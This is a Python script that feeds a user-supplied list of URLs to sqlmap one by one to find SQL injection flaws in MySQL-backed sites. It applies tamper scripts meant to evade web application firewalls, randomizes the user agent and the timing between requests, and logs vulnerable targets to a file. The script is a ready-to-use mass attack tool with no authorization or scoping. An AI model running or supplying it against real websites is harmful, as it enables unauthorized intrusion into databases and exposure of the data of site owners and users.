#!/usr/bin/env python3

import os
import subprocess
import time
import random

# Config
SQLMAP_PATH = "sqlmap"
OUTPUT_FILE = "sqli.txt"
TAMPER_SCRIPTS = "between,randomcase,charunicodeencode,space2comment"
MIN_DELAY = 1.0
MAX_DELAY = 2.5

def run_sqlmap(url):
    print(f"\n[+] Scanning: {url}")

    cmd = [
        SQLMAP_PATH,
        "-u", url,
        "--batch",
        "--random-agent",
        "--level=3",
        "--risk=2",
        "--tamper", TAMPER_SCRIPTS,
        "--technique=BEUSTQ",
        "--time-sec=10",
        "--delay=0.3",
        "--timeout=20",
        "--retries=2",
        "--threads=3",
        "--fresh-queries",
        "--smart",
        "--dbms=MySQL"
    ]

    try:
        result = subprocess.run(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
        output = result.stdout.lower()

        if "is vulnerable" in output or "sql injection" in output:
            with open(OUTPUT_FILE, "a") as f:
                f.write(f"{url}\ndatabase:\nMySQL\n\n")
            print(f"[✓] SQLi found: {url}")
        else:
            print("[-] Not vulnerable.")

    except Exception as e:
        print(f"[!] Error scanning {url}: {e}")

def main():
    url_file = input("[?] Enter path to URL list (e.g. urls.txt): ").strip()

    if not os.path.exists(url_file):
        print(f"[!] File not found: {url_file}")
        return

    with open(url_file, "r") as f:
        urls = [line.strip() for line in f if line.strip()]

    print(f"[i] Starting SQLi scan on {len(urls)} URLs (MySQL only)...\n")

    for url in urls:
        run_sqlmap(url)
        time.sleep(random.uniform(MIN_DELAY, MAX_DELAY))

    print(f"\n[✓] Scan complete. Results saved to: {OUTPUT_FILE}")

if __name__ == "__main__":
    main()
